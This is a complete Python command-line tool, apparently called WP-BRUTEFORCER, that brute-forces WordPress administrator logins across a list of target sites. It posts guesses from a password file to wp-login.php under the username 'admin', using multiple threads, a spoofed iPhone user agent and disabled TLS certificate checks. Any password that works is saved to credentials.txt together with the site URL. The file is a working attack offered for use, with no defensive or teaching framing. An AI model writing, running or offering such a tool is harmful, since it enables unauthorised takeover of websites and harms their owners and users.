#!/bin/env python3

import os
import re
import ssl
import time
import urllib.parse
import urllib.request

from datetime import datetime
from argparse import FileType
from argparse import ArgumentParser
from concurrent.futures import as_completed
from concurrent.futures import ThreadPoolExecutor
from contextlib import redirect_stderr

BANNER = """\
▖  ▖▄▖  ▄▖▖▖▄▖▖▖▄▖▄▖
▌▞▖▌▙▌  ▙▖▌▌▌ ▙▘▙▖▙▘
▛ ▝▌▌ ▄▖▌ ▙▌▙▖▌▌▙▖▌▌
"""

UNVERIFIED_CONTEXT = ssl._create_unverified_context()

def printBanner(start=False):
    current_time = ""
    if start:
        current_time = "[INF] Starting at " + datetime.now().strftime("%H:%M:%S (%d-%m-%Y)")
    print(BANNER + current_time + "\n\n")

def sliceList(content):
    return [line.strip() for line in content.readlines()]

def saveToFile(file_path, line):
    with open(file_path, 'a', encoding='utf-8') as file:
        file.write(line + '\n')

def login(url, username, password, timeout=5):
    url = urllib.parse.urljoin(url, "/wp-login.php/")
    form = f"log={username}&pwd={password}".encode("utf-8")
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    try:
        request = urllib.request.Request(url, data=form, headers=headers)
        with redirect_stderr(open(os.devnull, 'w')):
            with urllib.request.urlopen(request, timeout=timeout, context=UNVERIFIED_CONTEXT) as response:
                return password if re.search("wp-admin", response.url) else False
    except:
        return False  # просто пропускаем ошибку

if __name__ == "__main__":
    parser = ArgumentParser(
        usage="python3 %(prog)s [options]",
        epilog="Example: python3 bruteforce.py -t targets.txt -p passwords.txt --thread 10",
    )
    target = parser.add_argument_group("target arguments")
    target.add_argument("-t", "--target", dest="target_list", type=FileType('r', encoding="utf-8"), help="url of the target", required=True)
    target.add_argument("-p", dest="pwd_list", type=FileType('r', encoding="utf-8"), help="passwords list", required=True)
    request = parser.add_argument_group()
    request.add_argument("--thread", metavar="", type=int, default=5, help="threads count (default: 5)")
    args = parser.parse_args()

    printBanner(True)

    passwords = sliceList(args.pwd_list)
    print(f"[INF] Loaded {len(passwords)} passwords to test")

    targets = sliceList(args.target_list)
    print(f"[INF] Loaded {len(targets)} targets to test")

    print(f"[INF] Starting brute force with {args.thread} threads...")

    for url in targets:
        try:
            print(f"[LOG] Start process to {url}")
            print("[LOG] Testing connection to target...")
            with redirect_stderr(open(os.devnull, 'w')):
                urllib.request.urlopen(url, timeout=5, context=UNVERIFIED_CONTEXT)

            start_time = time.time()
            found = False

            with ThreadPoolExecutor(max_workers=args.thread) as executor:
                futures = {executor.submit(login, url, 'admin', pwd): pwd for pwd in passwords}

                for i, future in enumerate(as_completed(futures)):
                    password = futures[future]
                    result = future.result()
                    if result:
                        found = True
                        print(f"\n\033[31m[OK] Found credentials! admin:{password}\033[0m")
                        saveToFile('credentials.txt', f"admin:{password} # {url}")
                        break

            print(f"[LOG] Time taken: {int(time.time() - start_time)} seconds")

        except:
            print(f"[ERR] Failed to connect or process {url}")
